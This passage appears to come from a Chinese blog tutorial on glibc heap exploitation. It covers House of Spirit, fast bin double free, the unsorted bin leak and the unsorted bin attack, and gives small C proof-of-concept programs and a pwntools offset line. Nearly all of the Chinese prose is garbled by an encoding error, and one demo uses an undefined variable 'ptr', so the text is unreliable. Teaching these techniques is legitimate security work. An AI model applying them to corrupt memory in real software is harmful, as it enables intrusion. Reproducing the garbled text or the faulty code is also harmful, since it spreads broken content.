è¿”å›çš„æ˜¯ç”¨æˆ·æ•°æ®åœ°å€ï¼Œæ‰€ä»¥ä¸¤ä¸ªåœ°å€ç›¸å·®0x10</p></blockquote><h3 id="fast-bin-house-of-spirit"><a href="#fast-bin-house-of-spirit" class="headerlink" title="fast bin house of spirit"></a>fast bin house of spirit</h3><p>House of Spirit è¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äºåœ¨ç›®æ ‡ä½ç½®å¤„ä¼ªé€  fastbin chunkï¼Œå¹¶å°†å…¶é‡Šæ”¾ï¼Œä»è€Œè¾¾åˆ°åˆ†é…æŒ‡å®šåœ°å€çš„ chunk çš„ç›®çš„ã€‚</p><p>æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç³»ç»Ÿå¯¹ chunk ä¼šæœ‰ç›¸åº”çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡æ£€æŸ¥ã€‚ç›¸å…³æ•°æ®å¦‚ä¸‹ï¼š</p><ul><li><p>fake chunk çš„ IS_MAPPED ä¸èƒ½ä¸º 1</p><p>è¿™ä¸ªæ ‡å¿—ä½ä½äºsizeä½äºŒæ¯”ç‰¹ä½ã€‚æ ‡å¿—ä½æ˜¯ 1 ä»£è¡¨å †å—ç”± mmap åˆ†é…ï¼Œè€Œ mmap åˆ†é…çš„å †å—ä¸è¿›å…¥ fast bin ç®¡ç†ã€‚</p></li><li><p>åœ°å€å¯¹é½</p><p>æ¯”å¦‚32ä½ç¨‹åºçš„è¯fake_chunkçš„prev_sizeæ‰€åœ¨åœ°å€å°±åº”è¯¥ä½ <code>0xXXXX0</code> æˆ– <code>0xXXXX4</code>ã€‚64ä½çš„è¯åœ°å€å°±åº”è¯¥åœ¨ <code>0xXXXX0</code> æˆ– <code>0xXXXX8</code> ã€‚</p></li><li><p>å¤§å°å¯¹é½</p><p>éœ€è¦æ»¡è¶³ fsat bin çš„å°ºå¯¸è¦æ±‚ï¼Œå¤§å°ä¸èƒ½å¤§äº0x80ã€‚</p></li><li><p>next chunk çš„å¤§å°ä¸èƒ½å°äº 2 * SIZE_SZï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº av-&gt;system_mem</p><p>æœ€å¤§ä¸èƒ½è¶…è¿‡ av-&gt;system_mem ï¼Œå³ 128kbã€‚next_chunk çš„å¤§å°ä¸€èˆ¬æˆ‘ä»¬ä¼šè®¾ç½®æˆä¸ºä¸€ä¸ªè¶…è¿‡ fast bin æœ€å¤§çš„èŒƒå›´çš„ä¸€ä¸ªæ•°ï¼Œä½†è¦å°äº 128kbï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯åœ¨ chunk è¿ç»­é‡Šæ”¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿä¿è¯ä¼ªé€ çš„ chunk åœ¨é‡Šæ”¾åèƒ½å¤ŸæŒ‚åœ¨ fast bin ä¸­ main_arena çš„å‰é¢ï¼Œè¿™æ ·ä»¥æ¥æˆ‘ä»¬å†ä¸€æ¬¡ç”³è¯·ä¼ªé€  chunk å¤§å°çš„å—æ—¶å¯ä»¥ç›´æ¥é‡å¯ä¼ªé€  chunkã€‚</p></li><li><p>ä¸èƒ½æ„æˆ double free çš„æƒ…å†µ</p><p>fake_chunkå‰ä¸€ä¸ªé‡Šæ”¾å—ä¸èƒ½æ˜¯fake_chunkæœ¬èº«ï¼Œå¦‚æœæ˜¯çš„è¯_int_freeå‡½æ•°å°±ä¼šæ£€æŸ¥å‡ºæ¥å¹¶ä¸”ä¸­æ–­</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">6</span>] __attribute__ ((aligned(<span class="hljs-number">16</span>)));    <span class="hljs-comment">//å¯¹é½</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>,fck);<br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//è¯¥ chunk çš„å¤§å°</span><br>    fck[<span class="hljs-number">5</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//ä¸‹ä¸€ä¸ª chunk çš„å¤§å°</span><br>    <span class="hljs-built_in">free</span> (&amp;fck[<span class="hljs-number">2</span>]);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new malloc addr is %p\n&quot;</span>,<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse.png"></p><p>æˆ‘ä»¬åœ¨ gdb é‡Œé¢èµ°ä¸€é</p><p>é¦–å…ˆåˆ†é… fake chunk ï¼Œæˆ‘ä»¬æŸ¥çœ‹è¯¥åœ°å€çš„å†…å­˜ä¿¡æ¯ï¼ˆæˆ‘ç¼–è¯‘çš„æ—¶å€™å¼€äº†ä¿æŠ¤æ‰€ä»¥æ¯ä¸€æ¬¡è¿è¡Œçš„åœ°å€ä¸ä¸€æ ·ï¼‰</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb1.png"></p><p>åœ¨æ‰§è¡Œå®Œèµ‹å€¼æ“ä½œä»¥åå°±å˜æˆäº†è¿™æ ·</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb2.png"></p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>æ‰€è°“ double free å°±æ˜¯åŒä¸€ä¸ªå †è¢«åˆ†é…ä¸¤æ¬¡ï¼Œå…¶å®ä¸ä»…ä»…æ˜¯ä¸¤æ¬¡ä¹Ÿå¯ä»¥æ˜¯å¤šæ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´è¢«é‡Šæ”¾çš„ chunk åœ¨ fast bin ä¸­å‡ºç°å¤šæ¬¡ã€‚è¿™æ ·ä¹‹åæˆ‘ä»¬å¯ä»¥ä» fast bin é“¾è¡¨ä¸­å–å‡ºåŒä¸€ä¸ªå †å—ï¼Œç»“åˆå †å—çš„æ•°æ®å†…å®¹å¯ä»¥å®ç°ç±»ä¼¼äºç±»å‹æ··æ·†çš„æ•ˆæœå•¦ã€‚ åŒæ ·ï¼Œå› ä¸ºä¸¤æ¬¡é‡Šæ”¾çš„åŒä¸€ä¸ªå †å—ä¼šå°†æŒ‡é’ˆæŒ‡å‘è‡ªå·±ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³„éœ² heap çš„åœ°å€ã€‚</p><p>double free èƒ½å¤ŸæˆåŠŸçš„åŸå› ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ï¼š</p><ul><li>fast bin çš„å †å—è¢«é‡Šæ”¾ä»¥å next_chunk çš„ prev_inuse ä½ä¸ä¼šè¢«æ¸…ç©º</li><li>fast bin åœ¨æ‰§è¡Œ free çš„æ—¶å€™ä»…ä»…éªŒè¯äº† main_area ç›´æ¥æŒ‡å‘çš„å—ï¼Œå³é“¾è¡¨æŒ‡é’ˆå¤´éƒ¨çš„å—ã€‚</li></ul><p>æ¼”ç¤ºè¯´æ˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr2 addr is %p\n&quot;</span>, ptr2);<br><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    <span class="hljs-comment">// leak heap addr</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ptr2 head addr is %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// alloc to stack</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;  <span class="hljs-comment">// modify chunk size</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble.png"></p><p>æˆ‘ä»¬åˆ†åˆ«åœ¨æ¯ä¸€æ¬¡çš„ free å’Œ malloc å¤„ä¸‹æ–­ç‚¹ï¼Œgdb ä¸­çš„æµç¨‹å¦‚ä¸‹ï¼š</p><p>ç¬¬ä¸€æ¬¡ free ptr1ï¼Œptr1çš„åœ°å€è¿›å…¥ fast bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble1.png"></p><p>ç¬¬ä¸€æ¬¡ free ptr2ï¼Œptr2 çš„åœ°å€è¿›å…¥ fast bin ï¼Œæ­¤æ—¶ ptr1 çš„ fd æŒ‡é’ˆæŒ‡å‘ ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble2.png"></p><p>ç¬¬äºŒæ¬¡ free ptr1ï¼Œæ­¤æ—¶ ptr2 çš„ fd æŒ‡é’ˆæŒ‡å‘ ptr1ï¼Œptr1 çš„ fd æŒ‡é’ˆä»ç„¶æŒ‡å‘ ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble3.png"></p><p>ç¬¬ä¸€æ¬¡ mallocï¼Œæœ€åè¿›çš„ ptr1 è¢«åˆ†é…å‡ºå»</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble4.png"></p><p>ç¬¬äºŒæ¬¡ mallocï¼Œ ptr2 è¢«åˆ†é…å‡ºå»ï¼Œä½†å› ä¸ºå› ä¸º ptr2 çš„ fd æŒ‡é’ˆæŒ‡å‘ ptr1ï¼Œæ‰€ä»¥ç³»ç»Ÿä»ç„¶è®¤ä¸º ptr1 åœ¨ fast bin ä¸­ï¼Œä½ç½®åœ¨ ptr2ä¹‹åï¼ˆè¿™ä¸ªå›¾æ˜¯æˆ‘ä»¬å¯¹ ptr1è¿›è¡Œäº†ä¸€äº› fd æ··æ·†çš„æ“ä½œä¹‹åæˆªçš„æ‰€ä»¥ ptr1 çš„æŒ‡é’ˆæŒ‡å‘ stackï¼‰</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble5.png"></p><p>ç¬¬ä¸‰æ¬¡mallocå°±ä¼šæŠŠ â€ ç³»ç»Ÿä»¥ä¸ºä»ç„¶åœ¨fast bin é‡Œ â€œ çš„ ptr1åˆ†é…å‡ºå»ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble6.png"></p><p>æœ€åå†ä¸€æ¬¡mallocï¼Œå°±ä¼šæŠŠæˆ‘ä»¬æ”¹å†™åçš„åœ°å€åˆ†é…ç»™å †å•¦</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble7.png"></p><h1 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h1><p>ç®€å•å›é¡¾ä¸€ä¸‹ unsortedbin çš„åŸºæœ¬æ¥æºå’Œä½¿ç”¨æƒ…å†µï¼š</p><h3 id="æ¥æº"><a href="#æ¥æº" class="headerlink" title="æ¥æº"></a>æ¥æº</h3><ul><li>å½“ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ chunk è¢«åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ä¹‹åï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº minsize ï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ã€‚</li><li>é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunk ï¼Œå¹¶ä¸”è¿™ä¸ª chunk ä¸å’Œ top chunk ç´§é‚»ï¼Œè¿™ä¸ª chunk å°±ä¼šè¢«æ”¾è¿› unsorted bin ä¸­</li><li>å½“è¿›è¡Œ malloc_consolidate æ—¶ï¼Œå¦‚æœä¸æ˜¯å’Œ top chunk è¿‘é‚»çš„è¯ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„ chunk æ”¾åˆ° unsorted bin ä¸­ã€‚</li></ul><h3 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h3><p>unsorted bin é‡‡ç”¨ FIFOï¼Œå³å…ˆè¿›åå‡ºçš„é¡ºåºé‡Šæ”¾ï¼Œä¹Ÿå°±æ˜¯è¯´ä» unsortedbin ä¸­å–å †å—çš„æ—¶å€™æ˜¯ä»å°¾éƒ¨å–æ‰€ä»¥ unsorted bin ä½¿ç”¨ bk æŒ‡é’ˆéå†å †å—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// é˜²æ­¢å †å—å¹¶å…¥Top chunkä¸­</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p -- %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>], ptr[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//åˆ†åˆ«æ˜¯fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gdb ä¸­çš„è°ƒè¯•æ˜¯è¿™æ ·çš„ï¼š</p><p>free ä¹‹åçš„å †ç»“æ„åŠå†…å­˜</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted1.png"></p><p>å¦‚æœä½ è¿è¡Œäº†ä¸Šé¢çš„ä»£ç ï¼Œå°±ä¼šå‘ç° unsorted bin ä¸­åªæœ‰ä¸€ä¸ª chunk æ—¶ï¼Œbin çš„ fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆéƒ½æŒ‡å‘ main_arena ã€‚åŒæ ·ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œå¤´éƒ¨ bin çš„ fd ä¼šæŒ‡å‘ main_arena ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted-leak1.png"></p><p><code>main_arena</code> å’Œ <code>__malloc_hook</code> çš„åœ°å€å·®æ˜¯ 0x10ï¼Œè€Œå¤§å¤šæ•°çš„ libc éƒ½å¯ä»¥ç›´æ¥æŸ¥å‡º <code>__malloc_hook</code> çš„åœ°å€ã€‚ä»¥ pwntools ä¸ºä¾‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">main_arena_offset = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]</span> + <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è·å¾— <code>main_arena</code> ä¸åŸºåœ°å€çš„åç§»äº†ã€‚</p><h3 id="Unsorted-Bin-Attack-åŸç†"><a href="#Unsorted-Bin-Attack-åŸç†" class="headerlink" title="Unsorted Bin Attack åŸç†"></a>Unsorted Bin Attack åŸç†</h3><p>åœ¨ _int_malloc ä¸­ç”±ä¸€æ®µä¸ bk æŒ‡é’ˆæœ‰å…³çš„ä»£ç ï¼Œå½“å°†ä¸€ä¸ª unsorted bin å–å‡ºçš„æ—¶å€™ï¼Œä¼šå°† <code>bck-&gt;fd</code> çš„ä½ç½®å†™å…¥æœ¬ Unsorted Bin çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;   <span class="hljs-comment">//å°† unsorted bin é“¾è¡¨çš„å¤´æŒ‡é’ˆçš„ bkå­—æ®µè®¾ç½®ä¸º bck</span><br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><blockquote><p>unsorted_chunks (av) ç”¨äºè·å– unsortedbin åŒå‘é“¾è¡¨å¤´éƒ¨çš„æŒ‡é’ˆ</p><p>unsorted_chunks (av) çš„ä¸¤ä¸ªé‡è¦å…ƒç´ ï¼š</p><p>fdï¼šbin [0]ï¼ˆæŒ‡å‘ä¸‹ä¸€å—æ•°æ®ï¼Œè¿™é‡ŒæŒ‡å‘ unsorted bin é“¾è¡¨çš„å¤´éƒ¨ï¼‰</p><p>bkï¼šbin [1]ï¼ˆæŒ‡å‘å‰ä¸€å—æ•°æ®ï¼Œè¿™é‡ŒæŒ‡å‘ unsorted bin é“¾è¡¨çš„å°¾éƒ¨ï¼‰</p></blockquote><p>unsorted bin ä»å°¾éƒ¨ä¾æ¬¡å¾€å‰éå†ï¼Œç”±äºéå†åˆ°ä¸€ä¸ª chunk å°±ä¼šè¿›è¡Œè„±é“¾ï¼Œæ‰€ä»¥å¦‚æœè¦è®¿é—®åˆ°ä¸‹ä¸€ä¸ª chunkï¼Œåªéœ€è¦è®¿é—® <strong>unsorted_chunks (av)-&gt;bk</strong> å°±å¯ä»¥äº†ï¼Œè€Œä¸”å½“ bk å†…å®¹ä¸º <strong>unsorted_chunks (av)</strong> åˆ™å¯ä»¥è¯´æ˜å…¨éƒ¨æ•°æ®å·²ç»è¢«éå†ï¼Œunsortbin æ— å†…å®¹äº†ã€‚</p><p>ä»£ç çš„åä¸¤è¡Œåœ¨åšçš„å°±æ˜¯æŠŠ victim ä¸­é“¾è¡¨ä¸­ç§»é™¤ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå°±åˆ©ç”¨ <code>bck-&gt;fd = unsorted_chunks (av);</code> å¾€ä¸Šé¢å†™äº†ä¸€ä¸ª <strong>unsorted_chunks (av) çš„åœ°å€</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªåœ¨ libc ä¸Šçš„åœ°å€ï¼Œç”± 0x7f å¼€å¤´ï¼Œæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¦‚æœæ§åˆ¶äº† bck ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨è„±é“¾çš„è¿‡ç¨‹ä¸­ï¼Œå¾€ <strong>victim-&gt;bk-&gt;fd</strong> å†™å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target_var = <span class="hljs-number">0</span>;   <span class="hljs-comment">//ç›®æ ‡å†™å…¥çš„æ ˆ</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);   <span class="hljs-comment">//é˜²æ­¢ä¸ top chunk åˆå¹¶</span><br>    <br>    <span class="hljs-built_in">free</span>(p);<br>    p[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);  <span class="hljs-comment">//p çš„ bk æŒ‡å‘target_var</span><br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-type">void</span>*)target_var);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…·ä½“æµç¨‹å¦‚ä¸‹å›¾</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_bin_attack_order.png"></p><p>åˆå§‹çŠ¶æ€çš„æ—¶å€™ï¼Œunsorted bin çš„ fd å’Œ bk å‡æŒ‡å‘ unsorted bin æœ¬èº«ã€‚ </p><p>æ‰§è¡Œ free(p) ï¼Œé‡Šæ”¾çš„ chunk è¿›å…¥ unsortedbin </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb1.png"></p><p>ä¿®æ”¹ p[1] ä¹‹åï¼ŒåŸæ¥åœ¨ unsorted bin ä¸­çš„ p çš„ bk æŒ‡é’ˆå°±ä¼šæŒ‡å‘ target addr-16 å¤„ä¼ªé€ çš„ chunkï¼Œå³ Target Value å¤„äºä¼ªé€  chunk çš„ fd å¤„ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb2.png"></p><p>å†æ¬¡ç”³è¯· chunkï¼Œå°±ä¼šä» unsortedbin ä¸­å–å‡ºï¼Œæ­¤æ—¶ unsortedbin ä¸­çš„ç»“æ„å˜æˆ</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb3.png"></p><p>æœ€åç»“æœå¦‚ä¸‹</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb4.png"></p><h1 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h1><blockquote><p>æè¿™é‡Œçš„æ—¶å€™å¤´æ˜æ˜çš„ï¼Œå…ˆè¿™ä¹ˆæ”¾ç€ï¼Œå¾…ä¿®æ”¹ğŸ˜¶â€ğŸŒ«ï¸</p></blockquote><h3 id="largebin-å¤ä¹ "><a href="#largebin-å¤ä¹ " class="headerlink" title="largebin å¤ä¹ "></a>largebin å¤ä¹ </h3><p>å¤§äº512ï¼ˆ1024ï¼‰å­—èŠ‚çš„ chunk ç§°ä¸º large chunkï¼Œlarge bin å°±æ˜¯ç”¨äºç®¡ç†è¿™äº› large chunk </p><p>è¢«é‡Šæ”¾è¿› Large Bin ä¸­çš„ chunk ï¼Œé™¤äº†å’Œå…¶ä»–çš„ bin ç›¸åŒçš„ prev_sizeã€sizeã€fdã€bk è¿™å‡ ä¸ªç»“æ„ä¹‹å¤–ï¼Œè¿˜å…·æœ‰ fd_nextsize å’Œ bk_nextsize :</p><ul><li>fd_nextsize æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</li><li>bk_nextsize æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</li></ul><p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·å¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†,æé«˜äº†å·¥ä½œæ•ˆç‡ã€‚</p><p>æ’åˆ—é¡ºåºï¼š</p><ol><li><p>æŒ‰ç…§å¤§å°é¡ºåºä»å°åˆ°å¤§æ’åº</p></li><li><p>å¦‚æœå¤§å°ç›¸åŒå°±æŒ‰ç…§ free çš„å…ˆåé¡ºåºæ’åº</p></li></ol><p>å¤šä¸ªå¤§å°ç›¸åŒçš„å †å—ï¼Œåªæœ‰é¦–ä¸ªå †å—çš„ fd_nextsize å’Œ bk_nextsize ä¼šæŒ‡å‘å…¶ä»–å †å—ï¼Œåä¹°ä½ å 